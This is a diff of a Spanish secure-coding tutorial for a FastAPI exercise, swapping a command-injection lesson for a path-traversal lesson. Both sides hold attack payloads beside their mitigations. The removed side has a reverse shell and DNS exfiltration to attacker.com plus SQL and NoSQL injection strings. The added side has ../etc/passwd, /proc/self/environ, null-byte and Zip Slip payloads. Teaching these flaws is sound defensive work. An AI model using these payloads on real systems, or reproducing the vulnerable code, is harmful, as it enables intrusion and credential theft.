@@ -1,211 +1,203 @@
-# Paso 1 — Command Injection
-**Tecnología:** Python / FastAPI | **OWASP:** A03:2021 – Injection | **CWE-78**
+# Paso 2 — Path Traversal
+**Tecnologia:** Python / FastAPI | **OWASP:** A01:2021 - Broken Access Control | **CWE-22**
 
 ---
 
-## ¿Qué es esta vulnerabilidad?
+## Que es esta vulnerabilidad?
 
-*Command Injection* ocurre cuando una aplicación construye un comando de sistema operativo concatenando datos controlados por el usuario y lo pasa a un intérprete de shell. El shell trata metacaracteres como `;`, `&&`, `|`, `` `...` `` y `$(...)` como separadores o expansores de comandos, lo que permite encadenar comandos arbitrarios al original.
+Path Traversal ocurre cuando una aplicacion usa input del usuario para construir rutas de sistema de archivos sin verificar que la ruta resultante permanece dentro del directorio autorizado. El atacante usa secuencias como `../` o su codificacion URL `%2e%2e%2f` para subir en la jerarquia de directorios y acceder a archivos fuera del scope permitido.
 
-Es una de las vulnerabilidades más graves en aplicaciones web: una explotación exitosa lleva directamente a **ejecución remota de código (RCE)** con los privilegios del proceso servidor. El impacto puede incluir robo de credenciales del sistema, instalación de backdoors, pivoting a redes internas o borrado de datos.
+El impacto va desde la lectura de archivos de configuracion y credenciales (`/etc/passwd`, `.env`, claves privadas) hasta escritura en rutas arbitrarias cuando el endpoint permite subir archivos. En Windows la secuencia equivalente es `.\..\` y existen variantes con codificacion doble y unicode.
 
-Aparece de forma recurrente en breaches reales. Un ejemplo notable fue la vulnerabilidad CVE-2021-41773 en Apache HTTP Server, donde una sola petición con path traversal + command injection comprometía el servidor completo.
+Ejemplos reales: CVE-2021-41773 en Apache HTTP Server (lectura arbitraria de archivos + RCE), CVE-2019-18818 en Strapi CMS, multiples CVEs en plataformas de descarga de documentos empresariales.
 
 ---
 
-## ¿Dónde ocurre en este código?
+## Donde ocurre en este codigo?
 
-**Archivo:** `src/python/routes/commands.py`
+**Archivo:** `src/python/routes/files.py`
 
 ```python
-# ❌ CÓDIGO VULNERABLE — estado actual del ejercicio
-@router.get("/ping")
-async def ping_host(host: str):
-    result = subprocess.run(
-        f"ping -c 1 {host}",   # 👈 input del usuario interpolado en la cadena
-        shell=True,             # 👈 activa el intérprete /bin/sh
-        capture_output=True,
-        text=True
-    )
-    return {"output": result.stdout}
+# CODIGO VULNERABLE — estado actual del ejercicio
+@router.get("/download")
+async def download_file(filename: str):
+    path = f"/var/www/public/{filename}"  # ruta construida con input sin verificar
+    return FileResponse(path)             # sirve cualquier ruta del sistema
 ```
 
-El problema es doble:
-1. `shell=True` hace que Python pase la cadena completa a `/bin/sh -c "ping -c 1 <VALOR>"`. El shell interpreta metacaracteres antes de ejecutar.
-2. El valor de `host` llega sin validación directamente desde la query string HTTP.
+El problema esta en la construccion de la ruta. La f-string concatena el directorio base con el nombre recibido sin verificar que el resultado este dentro de `/var/www/public`. `FileResponse` leera el archivo resultante independientemente de donde apunte.
 
-Cuando el servidor recibe `host=8.8.8.8; cat /etc/passwd`, construye:
-```sh
-/bin/sh -c "ping -c 1 8.8.8.8; cat /etc/passwd"
-```
-El shell ejecuta `ping` y luego `cat /etc/passwd`, devolviendo el archivo de credenciales en la respuesta.
+Cuando `filename=../../etc/passwd`, la ruta resulta `/var/www/public/../../etc/passwd`, que el SO resuelve como `/etc/passwd`.
 
 ---
 
-## Cómo lo explotaría un atacante
+## Como lo explotaria un atacante
 
-**Ataque básico — separador `;`:**
+**Lectura de credenciales del sistema:**
 ```
-GET /ping?host=8.8.8.8;cat+/etc/passwd
+GET /download?filename=../../etc/passwd
 ```
-Resultado: el servidor ejecuta `ping` y después lee `/etc/passwd`.
+Devuelve los usuarios del sistema con sus home directories y shells.
 
-**Reverse shell — subshell `$()`:**
+**Lectura de variables de entorno del proceso:**
 ```
-GET /ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261'
+GET /download?filename=../../../proc/self/environ
 ```
-Abre una shell interactiva hacia la máquina del atacante.
+En Linux, `/proc/self/environ` contiene todas las variables de entorno del proceso servidor, incluyendo claves API, contrasenas de base de datos y tokens JWT.
 
-**Exfiltración out-of-band via DNS (evade firewalls):**
+**Lectura del codigo fuente:**
 ```
-GET /ping?host=8.8.8.8;nslookup+$(whoami).attacker.com
+GET /download?filename=../routes/serialize.py
 ```
-El nombre del usuario del proceso servidor llega codificado en una petición DNS al dominio del atacante.
+El atacante descarga el codigo de la aplicacion para buscar otras vulnerabilidades.
 
-**Bypass con backticks:**
+**Bypass de filtros basicos con codificacion URL:**
 ```
-GET /ping?host=8.8.8.8%60id%60
+GET /download?filename=..%2F..%2Fetc%2Fpasswd
+GET /download?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+GET /download?filename=....//....//etc/passwd
 ```
-Equivalente a `$(id)`, produce el mismo efecto en muchos shells.
 
 ---
 
-## Tu tarea: aplicar la mitigación
+## Tu tarea: aplicar la mitigacion
 
-Modifica `src/python/routes/commands.py` para que el endpoint rechace inputs inválidos y no use el intérprete de shell:
+Modifica `src/python/routes/files.py` para resolver la ruta canonica y verificar que esta dentro del directorio autorizado:
 
 ```python
-# ✅ CÓDIGO SEGURO
-import re
-import subprocess
+# CODIGO SEGURO
+import os
 from fastapi import APIRouter, HTTPException
+from fastapi.responses import FileResponse
 
 router = APIRouter()
 
-# Allowlist estricta: solo hostnames/IPs con caracteres legítimos
-VALID_HOSTNAME = re.compile(r'^[a-zA-Z0-9.\-]{1,253}$')
+ALLOWED_DIR = os.path.realpath("/var/www/public")
 
-@router.get("/ping")
-async def ping_host(host: str):
-    if not VALID_HOSTNAME.match(host):
-        raise HTTPException(status_code=400, detail="Hostname inválido")
-    result = subprocess.run(
-        ["ping", "-c", "1", host],  # ✅ lista de args → execvp() directo, sin shell
-        capture_output=True,
-        text=True,
-        timeout=5
-    )
-    return {"output": result.stdout}
+@router.get("/download")
+async def download_file(filename: str):
+    real_path = os.path.realpath(os.path.join(ALLOWED_DIR, filename))
+    if not real_path.startswith(ALLOWED_DIR + os.sep):
+        raise HTTPException(status_code=400, detail="Acceso denegado")
+    if not os.path.isfile(real_path):
+        raise HTTPException(status_code=404, detail="Archivo no encontrado")
+    return FileResponse(real_path)
 ```
 
-### ¿Por qué funciona esta mitigación?
+### Por que funciona esta mitigacion?
 
-- **Lista de argumentos:** cuando `subprocess.run()` recibe una lista, Python llama directamente a `execvp()` del SO. No hay shell intermediario. Los metacaracteres `;`, `&&` y `|` son pasados como texto literal al programa.
-- **Eliminar `shell=True`:** sin esta flag, Python nunca invoca `/bin/sh`. El kernel ejecuta el binario directamente.
-- **Allowlist con regex:** rechaza antes de llegar al subproceso. La regex `^[a-zA-Z0-9.\-]{1,253}$` excluye todos los metacaracteres de shell.
-- **`timeout=5`:** previene DoS donde el atacante fuerza `ping` hacia hosts inalcanzables para agotar threads.
+- **`os.path.realpath()`:** resuelve toda secuencia `../`, enlaces simbolicos y codificaciones de forma canonica. La ruta `../../etc/passwd` se convierte en `/etc/passwd` antes de la comparacion, revelando que esta fuera del directorio permitido.
+- **`startswith(ALLOWED_DIR + os.sep)`:** el `+ os.sep` es critico. Sin el, un directorio `/var/www/public_malicious/file` pasaria la comprobacion `startswith("/var/www/public")` por ser un prefijo de texto valido. El separador `/` garantiza que la ruta es un subdirectorio real.
+- **`os.path.isfile()`:** verifica que el path resuelto es un archivo regular, rechazando dispositivos de bloque, FIFOs o directorios.
 
 ---
 
-## Variantes de la misma categoría (Injection — más complejas)
+## Variantes de la misma categoria (Broken Access Control — mas complejas)
 
-### Variante A: Argument Injection (sin `shell=True`, pero args controlables)
+### Variante A: Zip Slip (Path Traversal en extraccion de archivos)
 
-Incluso sin `shell=True`, si los argumentos del subproceso son controlados por el usuario, hay programas que interpretan flags peligrosas:
-
-```python
-# ❌ VULNERABLE — convert (ImageMagick) acepta flags que ejecutan código
-@router.get("/thumbnail")
-async def make_thumbnail(filename: str):
-    # Sin shell=True, pero filename puede contener flags de ImageMagick
-    subprocess.run(["convert", filename, "-resize", "100x100", "/tmp/thumb.jpg"])
-```
-
-Ataque: `filename=-write|id>/tmp/rce` o usando la feature `Ghostscript delegate`:
-```
-GET /thumbnail?filename=image.jpg%22%20-write%20%22|id%20>/tmp/rce%22
-```
+Un archivo ZIP malicioso puede contener entradas con rutas como `../../etc/cron.d/backdoor`. Si el codigo extrae sin validar, escribe archivos fuera del directorio destino:
 
 ```python
-# ✅ SEGURO — validar nombre y construir ruta controlada
-SAFE_NAME = re.compile(r'^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$')
+# VULNERABLE — extraccion directa sin verificar destino
+import zipfile
 
-@router.get("/thumbnail")
-async def make_thumbnail(filename: str):
-    if not SAFE_NAME.match(filename):
+@router.post("/upload-zip")
+async def upload_zip(file: UploadFile):
+    with zipfile.ZipFile(file.file) as z:
+        z.extractall("/var/uploads/")  # extrae a donde diga el ZIP
+```
+
+Un ZIP con la entrada `../../etc/cron.d/backdoor` escribira un script de cron malicioso.
+
+```python
+# SEGURO — verificar cada entrada antes de extraer
+@router.post("/upload-zip")
+async def upload_zip(file: UploadFile):
+    dest = os.path.realpath("/var/uploads")
+    with zipfile.ZipFile(file.file) as z:
+        for member in z.namelist():
+            target = os.path.realpath(os.path.join(dest, member))
+            if not target.startswith(dest + os.sep):
+                raise HTTPException(status_code=400, detail="Zip Slip detectado")
+        z.extractall(dest)
+```
+
+---
+
+### Variante B: Path Traversal via nombre de archivo con null byte
+
+Algunas validaciones comprueban la extension del archivo pero no sanitizan bytes nulos. En entornos C/PHP, el string se trunca en `\0`:
+
+```python
+# VULNERABLE — validacion de extension bypasseable con null byte
+@router.get("/download")
+async def download_file(filename: str):
+    if not filename.endswith(".pdf"):
         raise HTTPException(status_code=400)
-    safe_path = os.path.join("/var/uploads", filename)  # ruta controlada por nosotros
-    subprocess.run(["convert", safe_path, "-resize", "100x100", "/tmp/thumb.jpg"])
+    path = f"/var/docs/{filename}"
+    return FileResponse(path)
 ```
 
----
-
-### Variante B: SQL Injection en consulta raw
-
-```python
-# ❌ VULNERABLE — concatenación directa en SQL
-@router.get("/orders")
-async def get_orders(user_id: str):
-    query = f"SELECT * FROM orders WHERE user_id = '{user_id}'"
-    cursor.execute(query)
-    return cursor.fetchall()
-```
-
-Payload `user_id=' OR '1'='1` devuelve todos los pedidos de la base de datos.  
-Payload `user_id='; DROP TABLE orders; --` borra la tabla.
+Payload: `filename=../../etc/passwd%00.pdf`  
+En algunos contextos el string se trunca en `%00` y el archivo servido es `/etc/passwd` aunque la validacion de extension pase.
 
 ```python
-# ✅ SEGURO — parámetros posicionales (placeholder)
-@router.get("/orders")
-async def get_orders(user_id: str):
-    cursor.execute("SELECT * FROM orders WHERE user_id = %s", (user_id,))
-    return cursor.fetchall()
-```
-
-El driver de base de datos envía el parámetro por separado del SQL; el motor nunca lo interpreta como sintaxis.
-
----
-
-### Variante C: Injection en operadores NoSQL (`$where` en MongoDB)
-
-```python
-# ❌ VULNERABLE — $where evalúa JavaScript en el servidor MongoDB
-@router.get("/search")
-async def search_users(role: str):
-    users = db.users.find({"$where": f"this.role == '{role}'"})
-    return list(users)
-```
-
-Payload `role=' || sleep(5000) || '1'=='1` provoca un DoS de 5 segundos.  
-Payload `role=' || this.password.match(/.*/) || '1'=='1` exfiltra contraseñas.
-
-```python
-# ✅ SEGURO — operador de igualdad directa, sin $where
-VALID_ROLES = {"admin", "user", "moderator"}
-
-@router.get("/search")
-async def search_users(role: str):
-    if role not in VALID_ROLES:
+# SEGURO — sanitizar caracteres de control y resolver ruta canonica
+@router.get("/download")
+async def download_file(filename: str):
+    if '\x00' in filename:
         raise HTTPException(status_code=400)
-    users = db.users.find({"role": role})  # comparación directa, sin JS
-    return list(users)
+    real = os.path.realpath(os.path.join(ALLOWED_DIR, filename))
+    if not real.startswith(ALLOWED_DIR + os.sep):
+        raise HTTPException(status_code=400)
+    return FileResponse(real)
+```
+
+---
+
+### Variante C: IDOR (Insecure Direct Object Reference) — acceso a recursos ajenos
+
+Path Traversal en el sentido logico: acceder a objetos de otro usuario cambiando un identificador predecible:
+
+```python
+# VULNERABLE — el invoice_id del path no se verifica contra el usuario autenticado
+@router.get("/invoice/{invoice_id}")
+async def get_invoice(invoice_id: int, current_user: User = Depends(get_current_user)):
+    invoice = db.query(Invoice).filter(Invoice.id == invoice_id).first()
+    return invoice  # devuelve la factura sin importar a quien pertenece
+```
+
+Un usuario autenticado puede cambiar `invoice_id=1001` por `invoice_id=1002` y ver facturas ajenas.
+
+```python
+# SEGURO — filtrar siempre por el usuario autenticado
+@router.get("/invoice/{invoice_id}")
+async def get_invoice(invoice_id: int, current_user: User = Depends(get_current_user)):
+    invoice = db.query(Invoice).filter(
+        Invoice.id == invoice_id,
+        Invoice.owner_id == current_user.id  # verifica propiedad
+    ).first()
+    if not invoice:
+        raise HTTPException(status_code=404)
+    return invoice
 ```
 
 ---
 
 ## Referencias
 
-- [OWASP A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
-- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
-- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
-- [Python subprocess — security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
-- [CVE-2021-41773 — Apache RCE via path traversal + CGI](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
+- [OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
+- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
+- [CWE-639: IDOR](https://cwe.mitre.org/data/definitions/639.html)
+- [Snyk - Zip Slip vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
+- [CVE-2021-41773 — Apache path traversal + RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773)
 
 ---
 
-## Lo que valida el workflow automáticamente
+## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 01** ejecuta `bash scripts/tutorial.sh validate-step 01` y exige que `src/python/routes/commands.py` contenga:
-- La expresión regular `VALID_HOSTNAME`
-- La llamada segura a `subprocess.run` con lista de argumentos
-- La ausencia de `shell=True`
+El workflow **Validate Step 02** comprueba que `src/python/routes/files.py` contenga:
+- `ALLOWED_DIR`
+- `os.path.realpath`
+- La verificacion con `startswith`
